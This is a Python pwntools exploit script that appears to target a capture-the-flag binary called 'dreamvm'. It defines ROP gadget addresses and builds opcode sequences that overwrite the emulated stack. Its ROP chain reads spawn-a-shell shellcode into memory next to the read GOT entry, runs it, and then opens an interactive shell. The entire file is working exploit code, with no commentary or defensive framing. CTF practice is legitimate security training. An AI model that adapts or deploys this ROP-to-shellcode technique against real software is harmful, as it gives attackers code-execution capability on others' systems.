from pwn import *
import struct
context.arch = 'amd64'
addrTable = {}
elf = ELF('dreamvm')
payload = ''
p = None
stack = []
shellcode = asm(shellcraft.sh())

def init():
    global addrTable
    addrTable.update({'rdi' : 0x400903})
    addrTable.update({'rsi' : 0x400901}) #rsi r15 ret
    addrTable.update({'rdx' : 0x400854}) #rdx rbx rbp r12 r13 ret
    addrTable.update({'open' : elf.plt['open']})
    addrTable.update({'plt_read' : elf.plt['read']})
    addrTable.update({'got_read' : elf.got['read']})
    addrTable.update({'write' : elf.plt['write']})
def writeStack(arr_data):
    global payload,stack
    for idx in range(len(arr_data)):
        payload += struct.pack('B', 6) + struct.pack('B', 1)
        stack.append(arr_data[idx])
def moveStack(size):
    global payload
    payload += struct.pack('B', 4) + struct.pack('<Q', size)
def addDummy():
    global payload
    payload += '\xaa'*(0xff - len(payload))
def buildROP(function, rdi, rsi, rdx):
    global addrTable
    rp = p64(addrTable['rdi']) + p64(rdi) + p64(addrTable['rsi']) + p64(rsi) + p64(rsi) + p64(addrTable['rdx']) + p64(rdx) + p64(0)*4 + p64(function)
    return rp

init()
p = process('dreamvm')
raw_input('debug: ' + str(p.pid))
addr_test = elf.symbols['code']
ropChain = buildROP(addrTable['plt_read'], 0, addrTable['got_read']-0x30, len(shellcode))
ropChain += p64(addrTable['got_read']-0x30)
print 'len: ' + hex(len(ropChain))
moveStack(0x30 + len(ropChain)) #
writeStack([ropChain[i:i+8] for i in range(0, len(ropChain), 8)])
addDummy()
p.sendline(payload)
for c in range(len(stack)):
    p.send(stack.pop())
p.sendline(shellcode)
p.interactive()
